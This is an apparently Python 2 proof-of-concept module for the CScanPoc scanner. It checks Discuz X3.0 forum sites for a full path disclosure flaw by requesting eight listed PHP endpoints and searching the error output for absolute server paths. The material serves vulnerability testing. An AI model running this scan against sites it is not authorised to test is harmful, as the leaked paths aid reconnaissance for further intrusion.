# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0101'  # 平台漏洞编号，留空
    name = 'Discuz X3.0 full Path Disclosure Vulnerability'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-06-25'  # 漏洞公布时间
    desc = '''
    Discuz X3.0 存在多处绝对路径泄露。
    '''  # 漏洞描述
    ref = 'Unknown',  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'X3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '35a6cc94-0d71-4cda-9530-78c02018223a'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payloads = [
                '/api/addons/zendcheck.php',
                '/api/addons/zendcheck52.php',
                '/api/addons/zendcheck53.php',
                '/source/plugin/mobile/api/1/index.php',
                '/source/plugin/mobile/extends/module/dz_digest.php',
                '/source/plugin/mobile/extends/module/dz_newpic.php',
                '/source/plugin/mobile/extends/module/dz_newreply.php',
                '/source/plugin/mobile/extends/module/dz_newthread.php',
            ]
            pathinfo = re.compile(r' in <b>(.*)</b> on line')
            for payload in payloads:
                verify_url = self.target + payload
                req = requests.get(verify_url)
                match = pathinfo.findall(req.content)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
